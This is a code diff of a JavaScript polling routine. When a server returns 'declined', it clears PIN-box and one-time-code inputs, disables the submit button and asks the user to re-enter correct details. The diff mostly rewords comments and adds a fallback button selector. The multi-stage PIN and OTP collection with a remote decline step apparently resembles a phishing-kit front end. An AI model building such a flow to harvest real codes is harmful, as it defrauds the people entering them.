@@ -556,40 +556,39 @@ async function startPolling(stage, currentPageId, nextPageId, spinnerId, msgId, 
       } else if (data.status === "declined") {
         clearInterval(pollingInterval);
         
-        // 1. Hide the full-screen waiting layout spinner overlay
+        // 1. Unveil the form viewport by hiding the loading screen overlay panel
         document.getElementById(spinnerId).classList.add("hidden");
         
-        // 2. Clear input elements on the current container
+        // 2. Clear input arrays safely within the specific container boundary view
         const currentContainer = document.getElementById(currentPageId);
         if (currentContainer) {
-          // Clears every text or telephone space inside the active page view
           const inputs = currentContainer.querySelectorAll('input');
           inputs.forEach(input => {
             input.value = '';
           });
         }
 
-        // 3. Manually sweep all PIN code slot boxes across the layout container
+        // 3. Reset the standard global pin grid input fields safely
         const globalPinBoxes = document.querySelectorAll('.boxes input');
         globalPinBoxes.forEach(box => {
           box.value = '';
         });
 
-        // 4. Force individual input elements directly by ID if any wrapper scopes miss them
+        // 4. Clean fixed target fields directly by structural ID attribute
         const explicitOtp = document.getElementById('code1');
         if (explicitOtp) explicitOtp.value = '';
 
-        // 5. Locate and disable the active page button to flip color back to its locked state
-        if (currentContainer) {
-          const actionBtn = currentContainer.querySelector('button');
-          if (actionBtn) actionBtn.disabled = true;
-        }
-        
-        // Force the main Page 3 button explicitly if it uses a fixed ID selector
+        // 5. Explicitly reset the targeted confirmation controls to locked state
         const explicitBtn = document.getElementById('submitCode1');
-        if (explicitBtn) explicitBtn.disabled = true;
+        if (explicitBtn) {
+          explicitBtn.disabled = true;
+        } else if (currentContainer) {
+          // Fallback mechanism to look up target click controls safely if the ID is missing
+          const primaryBtn = currentContainer.querySelector('#submitCode1, button[id*="submit"], button:not([id*="decline"])');
+          if (primaryBtn) primaryBtn.disabled = true;
+        }
 
-        // 6. Present the incorrect code warning text directly onto the active container screen area
+        // 6. Present the rejection message directly onto the target element
         msgElement.className = "error";
         msgElement.innerText = "Incorrect entry. Please enter the correct details.";
       }
